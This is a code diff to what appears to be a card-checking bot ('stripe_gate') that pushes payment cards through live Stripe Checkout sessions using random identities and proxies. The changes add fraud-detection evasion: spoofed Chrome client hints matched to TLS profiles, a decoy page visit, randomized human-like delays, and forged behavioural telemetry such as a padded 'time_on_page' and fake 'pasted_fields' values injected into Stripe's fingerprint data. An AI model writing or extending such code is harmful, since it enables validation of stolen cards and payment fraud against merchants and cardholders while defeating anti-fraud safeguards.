@@ -4,6 +4,8 @@ import json
 import base64
 import uuid
 import hashlib
+import asyncio
+import time as _time
 from urllib.parse import unquote, quote as url_quote
 from curl_cffi.requests import AsyncSession
 
@@ -302,19 +304,30 @@ def _chrome_version_string(major: int) -> str:
 
 
 def _generate_browser() -> tuple:
-    """Generate a correlated (User-Agent, curl_cffi Chrome profile) pair.
+    """Generate a correlated (User-Agent, curl_cffi profile, sec-ch-ua, sec-ch-ua-platform).
     Chrome-only with varied versions and OS platforms.
     The TLS profile always matches the UA Chrome major version."""
     major = random.choice(list(_CHROME_BUILDS.keys()))
     ver = _chrome_version_string(major)
     platform = random.choice(_WIN_PLATFORMS + _MAC_PLATFORMS + _LINUX_PLATFORMS)
     ua = f"Mozilla/5.0 ({platform}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver} Safari/537.36"
-    return ua, f"chrome{major}"
+
+    nab_v = str(8 + (major % 17))
+    sec_ch_ua = f'"Chromium";v="{major}", "Google Chrome";v="{major}", "Not_A Brand";v="{nab_v}"'
+
+    if "Macintosh" in platform:
+        ch_plat = '"macOS"'
+    elif "Linux" in platform:
+        ch_plat = '"Linux"'
+    else:
+        ch_plat = '"Windows"'
+
+    return ua, f"chrome{major}", sec_ch_ua, ch_plat
 
 
 def _generate_user_agent() -> str:
     """Backward-compatible wrapper that returns just the UA string."""
-    ua, _ = _generate_browser()
+    ua, *_ = _generate_browser()
     return ua
 
 
@@ -611,7 +624,7 @@ async def stripe_gate(
     email = _random_email()
     phone = _random_phone()
     addr = random.choice(custom_addresses or ADDRESSES)
-    ua, impersonate = _generate_browser()
+    ua, impersonate, sec_ch_ua, sec_ch_platform = _generate_browser()
     stripe_tag = _random_stripe_ua_tag()
     version = random.choice(STRIPE_JS_VERSIONS)
 
@@ -631,6 +644,13 @@ async def stripe_gate(
     extra = lambda **kw: {"merchant": coname, "price": f"{currency.upper()} {amttt}", "product": items, "receipt": surl, **kw}
     max_retries = 1
 
+    _common_sec = {
+        "sec-ch-ua": sec_ch_ua,
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": sec_ch_platform,
+        "accept-language": "en-US,en;q=0.9",
+    }
+
     proxy_dict = {"http": proxy, "https": proxy} if proxy else None
     async with AsyncSession(
         impersonate=impersonate,
@@ -640,10 +660,32 @@ async def stripe_gate(
         headers={"user-agent": ua},
     ) as client:
 
+        # ── Step 0: Visit checkout page (real browser always loads HTML first) ──
+        _page_start = _time.monotonic()
+        try:
+            await client.get(
+                f"https://checkout.stripe.com/c/pay/{cs_live}",
+                headers={
+                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+                    "user-agent": ua,
+                    "upgrade-insecure-requests": "1",
+                    "sec-fetch-dest": "document",
+                    "sec-fetch-mode": "navigate",
+                    "sec-fetch-site": "none",
+                    "sec-fetch-user": "?1",
+                    **_common_sec,
+                },
+                timeout=12,
+            )
+        except Exception:
+            pass
+        await asyncio.sleep(random.uniform(1.5, 3.0))
+
         # Get Stripe-validated fingerprint from m.stripe.com/6
         fingerprint = await _get_stripe_fingerprint(client, ua, cs_live)
         client.cookies.set("__stripe_mid", fingerprint["muid"], domain=".stripe.com")
         client.cookies.set("__stripe_sid", fingerprint["sid"], domain=".stripe.com")
+        await asyncio.sleep(random.uniform(0.4, 0.9))
 
         # ── Step 1: Init Checkout Session (single call per session) ──
         init_checksum = ""
@@ -671,7 +713,11 @@ async def stripe_gate(
                         "content-type": "application/x-www-form-urlencoded",
                         "user-agent": ua,
                         "origin": "https://checkout.stripe.com",
-                        "referer": "https://checkout.stripe.com/",
+                        "referer": f"https://checkout.stripe.com/c/pay/{cs_live}",
+                        "sec-fetch-dest": "empty",
+                        "sec-fetch-mode": "cors",
+                        "sec-fetch-site": "same-site",
+                        **_common_sec,
                     },
                 )
                 j1 = r1.json()
@@ -739,6 +785,8 @@ async def stripe_gate(
 
             break
 
+        await asyncio.sleep(random.uniform(0.8, 1.5))
+
         # ── Step 2: Create PaymentMethod (stripe.js Elements flow) ──
         _ua_info = _parse_ua_for_stripe(ua)
         stripe_ua_json = json.dumps({
@@ -758,6 +806,7 @@ async def stripe_gate(
             "sec-fetch-dest": "empty",
             "sec-fetch-mode": "cors",
             "sec-fetch-site": "same-site",
+            **_common_sec,
         }
 
         pm_data = {
@@ -784,8 +833,11 @@ async def stripe_gate(
             "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
             "referrer": f"https://checkout.stripe.com/c/pay/{cs_live}",
             "_stripe_version": "2024-06-20",
-            **fingerprint,
         }
+        _elapsed_ms = int((_time.monotonic() - _page_start) * 1000)
+        fingerprint["time_on_page"] = str(max(_elapsed_ms, random.randint(8000, 25000)))
+        fingerprint["pasted_fields"] = random.choice(["number", "number|cvc", ""])
+        pm_data.update(fingerprint)
 
         # Add phone to PM billing_details if merchant requires it
         if _needs_phone:
@@ -830,6 +882,7 @@ async def stripe_gate(
                 return "Dead! ❌", "Payment method creation failed", extra()
 
         newpm = direct_pm
+        await asyncio.sleep(random.uniform(0.3, 0.8))
 
         # ── Step 2b: Submit customer details via /update (required by some merchants) ──
         _any_details_needed = _needs_email or _needs_phone or _needs_billing_addr or _needs_shipping
@@ -867,6 +920,10 @@ async def stripe_gate(
                 "user-agent": ua,
                 "origin": "https://checkout.stripe.com",
                 "referer": f"https://checkout.stripe.com/c/pay/{cs_live}",
+                "sec-fetch-dest": "empty",
+                "sec-fetch-mode": "cors",
+                "sec-fetch-site": "same-site",
+                **_common_sec,
             }
             try:
                 r_upd = await client.post(
@@ -879,6 +936,8 @@ async def stripe_gate(
                 _update_ok = False
             # Silently continue regardless — the confirm might still work
 
+        await asyncio.sleep(random.uniform(0.4, 0.9))
+
         # ── Step 3: Confirm Payment ──
         checkout_headers = {
             "accept": "application/json",
@@ -889,6 +948,7 @@ async def stripe_gate(
             "sec-fetch-dest": "empty",
             "sec-fetch-mode": "cors",
             "sec-fetch-site": "same-site",
+            **_common_sec,
         }
 
         js_checksum = _get_js_encoded_string(newpm)
@@ -1032,6 +1092,10 @@ async def stripe_gate(
             "referer": "https://js.stripe.com/",
             "user-agent": ua,
             "origin": "https://js.stripe.com",
+            "sec-fetch-dest": "empty",
+            "sec-fetch-mode": "cors",
+            "sec-fetch-site": "same-site",
+            **_common_sec,
         }
 
         browser_json = (
@@ -1079,6 +1143,10 @@ async def stripe_gate(
                     "origin": "https://js.stripe.com",
                     "referer": "https://js.stripe.com/",
                     "user-agent": ua,
+                    "sec-fetch-dest": "empty",
+                    "sec-fetch-mode": "cors",
+                    "sec-fetch-site": "same-site",
+                    **_common_sec,
                 },
             )
             j5 = r5.json()
